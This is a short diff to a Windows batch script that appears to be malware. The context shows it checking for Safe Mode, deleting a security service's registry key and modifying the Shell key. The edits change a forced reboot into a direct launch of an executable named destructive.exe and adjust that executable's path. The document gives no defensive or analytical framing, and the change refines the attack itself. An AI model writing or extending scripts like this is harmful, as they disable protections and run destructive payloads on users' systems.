@@ -133,7 +133,7 @@ if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
 ) else (
     echo Safe Mode is not enabled
-    "c:\program files\utkudrk2\destructive.exe"
+    "C:\Program Files\utkudrk2\destructive.exe"
     exit
 )
 
@@ -209,8 +209,8 @@ reg delete "HKLM\SYSTEM\ControlSet002\Services\VSSERV" /f
 :: Confirm completion
 echo Cleanup tasks completed. Safe Mode should now be removed, desturctive.exe is scheduled to run, and Shell key is modified.
 
-:: Reboot the system after completion
-shutdown /r /f /t 5
+:: Run the destructive.exe
+"C:\Program Files\utkudrk2\destructive.exe"
 
 :: Exit
 exit
